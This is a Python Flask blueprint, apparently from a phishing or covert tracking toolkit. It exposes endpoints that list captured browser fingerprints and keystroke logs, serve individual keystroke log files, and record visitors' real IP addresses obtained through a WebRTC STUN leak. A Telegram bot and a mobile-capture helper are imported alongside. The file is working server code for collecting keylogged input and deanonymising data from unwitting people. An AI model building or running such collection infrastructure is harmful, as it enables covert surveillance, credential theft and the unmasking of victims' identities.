"""intel blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db

import platform
from telegram_bot import telegram_bot
from app.services import intel as intelsvc
bp = Blueprint("intel", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/fingerprints/list')
def list_fingerprints():
    """List all captured fingerprints with details"""
    try:
        fp_dir = os.path.join(BASE_DIR, 'fingerprints')
        os.makedirs(fp_dir, exist_ok=True)
        
        return jsonify({'fingerprints': intelsvc.list_fingerprints()})
    except Exception as e:
        return jsonify({'error': str(e), 'fingerprints': []}), 500

@bp.route('/api/keystrokes/list')
def list_keystrokes():
    """List all captured keystroke logs"""
    try:
        ks_dir = os.path.join(BASE_DIR, 'keystrokes')
        os.makedirs(ks_dir, exist_ok=True)
        
        return jsonify({'keystrokes': intelsvc.list_keystrokes()})
    except Exception as e:
        return jsonify({'error': str(e), 'keystrokes': []}), 500

@bp.route('/api/keystrokes/view/<filename>')
def view_keystroke_file(filename):
    """View a specific keystroke log file"""
    try:
        data = intelsvc.load_keystroke_file(filename)
        if data is not None:
            return jsonify(data)
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/webrtc_leak', methods=['POST'])
def webrtc_leak():
    """Receive real IP address from WebRTC STUN leak"""
    try:
        data = request.json
        intelsvc.record_webrtc_leak(data, request.remote_addr)
        return jsonify({'status': 'received'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
